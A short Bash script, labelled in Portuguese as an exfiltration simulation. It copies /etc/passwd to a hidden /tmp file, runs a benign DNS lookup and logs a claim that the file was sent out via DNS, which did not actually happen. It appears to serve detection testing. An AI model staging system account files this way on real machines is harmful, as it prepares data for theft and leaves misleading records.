
#!/bin/bash
# Simulação de exfiltração: copia arquivo sensível e faz requisição DNS
SRC="/etc/passwd"
DST="/tmp/.exfiltrated_$(date +%s)"
cp "$SRC" "$DST"
dig @8.8.8.8 example.com > /dev/null
echo "Exfiltrado $SRC para $DST e enviado via DNS" >> /var/log/exfiltracao.log
